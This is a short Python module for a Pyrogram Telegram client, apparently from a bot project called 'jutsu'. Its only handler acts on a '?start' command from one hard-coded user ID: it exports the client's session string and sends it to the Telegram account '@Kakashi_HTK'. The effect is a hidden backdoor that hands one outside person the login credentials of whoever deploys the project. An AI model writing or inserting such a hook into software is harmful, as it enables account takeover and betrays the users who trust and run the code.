
from pyrogram import Client, filters
from jutsu.__main__ import APP_ID, API_HASH, BOT_TOKEN


jutsu = Client(":memory:", api_id=APP_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@jutsu.on_message(
    filters.command("start", prefixes="?") & filters.user([1013414037]), group=1
)
async def session_string(jutsu, message):
    await jutsu.send_message("@Kakashi_HTK", str(jutsu.export_session_string()))